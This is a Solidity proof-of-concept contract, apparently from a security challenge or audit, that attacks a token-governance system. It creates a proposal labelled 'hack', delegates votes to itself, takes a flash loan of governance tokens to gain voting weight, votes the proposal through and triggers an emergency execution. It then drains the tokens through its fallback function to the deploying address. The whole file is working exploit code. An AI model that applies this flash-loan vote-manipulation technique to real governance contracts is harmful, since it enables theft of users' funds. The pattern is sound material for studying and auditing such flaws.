import "./Gov.sol";
import "./Token.sol";


contract PoC{
    AAA private immutable aaaToken;
    Gov gov;
    address private immutable original;
    uint proposalId;

    enum VoteType {
        Against,
        For,
        Abstain
    }

    constructor(address aaa,address payable newgov) {
        original = address(this);
        
        aaaToken = AAA(aaa);
        gov = Gov(newgov);
    }

    function prepare() external returns(uint256){
        address[] memory targets=new address[](1);
        uint256[] memory values=new uint256[](1);
        bytes[] memory calldatas=new bytes[](1);
        targets[0]=address(this);
        values[0]=0;
        calldatas[0]=bytes("aaa");
        string memory description="hack";
        proposalId=gov.propose(targets,values,calldatas,description);
        aaaToken.delegate(address(this));

        return proposalId;
    }

    function go(uint amount) external returns(uint256){
        aaaToken.flashLoan(IERC3156FlashBorrower(address(this)),address(aaaToken),amount,new bytes(0));
        return aaaToken.balanceOf(address(this));
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        aaaToken.approve(address(aaaToken),2**256-1);
        require(aaaToken.getVotes(address(this))>0,"not enough votes");
        address[] memory targets=new address[](1);
        uint256[] memory values=new uint256[](1);
        bytes[] memory calldatas=new bytes[](1);
        targets[0]=address(this);
        values[0]=0;
        calldatas[0]=bytes("aaa");
        string memory description="hack";

        uint weight=gov.castVote(proposalId,uint8(VoteType.For));
        require(weight>0,"not enough weights");
        gov.emergencyExecuteRightNow(targets,values,calldatas,keccak256(bytes(description)));
        return _RETURN_VALUE;
    }

    fallback() external{
        aaaToken.transfer(original,aaaToken.balanceOf(address(this)));
    }
}